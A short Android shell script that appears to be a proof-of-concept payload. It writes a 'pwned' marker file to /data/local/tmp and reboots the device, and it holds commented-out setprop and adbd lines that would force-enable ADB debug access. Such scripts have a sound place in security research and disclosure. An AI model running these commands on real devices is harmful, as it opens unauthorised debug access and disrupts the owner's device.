#!/system/bin/sh

# setprop persist.sys.usb.config adb,mtp
# setprop persist.service.adb.enable 1
# /system/bin/adbd &

touch /data/local/tmp/pwned && reboot # as proof-of-concept

